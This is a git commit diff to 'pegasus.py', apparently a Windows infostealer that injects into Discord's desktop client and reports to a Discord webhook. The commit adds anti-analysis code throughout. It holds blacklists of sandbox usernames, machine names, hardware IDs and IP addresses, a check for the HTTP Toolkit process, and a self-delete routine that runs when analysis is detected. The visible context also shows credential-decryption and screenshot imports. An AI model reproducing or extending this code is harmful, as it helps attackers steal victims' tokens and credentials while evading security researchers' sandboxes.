7bd3480661e944a7a20b3e5d9a7513c5074684d7
addi00000 <addison@othius.com>
2022-04-10 22:33:00 -0400

    Added anti-debug

--- pegasus.py
+++ pegasus.py
@@ -9,16 +9,17 @@ from re import findall, match
 from shutil import copy2
 from sqlite3 import connect
 from subprocess import PIPE, Popen
+from threading import Thread
 from time import localtime, strftime
 from urllib.request import urlopen
 from zipfile import ZipFile
 
+import psutil
 import requests
 from Crypto.Cipher import AES
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
-from threading import Thread
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
@@ -458,9 +459,66 @@ def inject(webhook_url):
                     with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                         indexFile.write(f)
                     os.startfile(abspath+os.sep+_dir+'.exe')
-                                            
+
+class debug:
+    def __init__(self):
+        if self.checks(): self.self_destruct()
+    
+    def checks(self):
+        debugging = False 
+        
+        # blackList from Rdimo
+        self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
+        self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
+        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
+        self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
+
+        if ("HTTP Toolkit.exe" in (p.name() for p in psutil.process_iter())): 
+            debugging = True
+            self.self_destruct()
+        
+        if self.get_ip(): debugging = True
+        if self.get_hwid(): debugging = True
+        if self.get_pcname(): debugging = True
+        if self.get_username(): debugging = True
+        
+        return debugging
+
+    def get_ip(self):
+        url = 'http://ipinfo.io/json'
+        response = urlopen(url)
+        data = load(response)
+        ip = data['ip']
+        
+        if ip in self.blackListedIPS:
+            return True
+        
+    def get_hwid(self):
+        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]       
+        
+        if hwid in self.blackListedHWIDS:
+            return True
+        
+    def get_pcname(self):
+        pc_name = os.getenv("COMPUTERNAME")
+        
+        if pc_name in self.blackListedPCNames:
+            return True
+        
+    def get_username(self):
+        pc_username = os.getenv("UserName")
+        
+        if pc_username in self.blackListedUsers:
+            return True
+        
+    def self_destruct(self):
+        os.system(f'del {os.path.dirname(__file__)}\{os.path.basename(__file__)}')
+        exit()
+                           
 if __name__ == '__main__':
     if os.name != "nt":
         exit()
-        
+    
+    debug()
     pegasus()
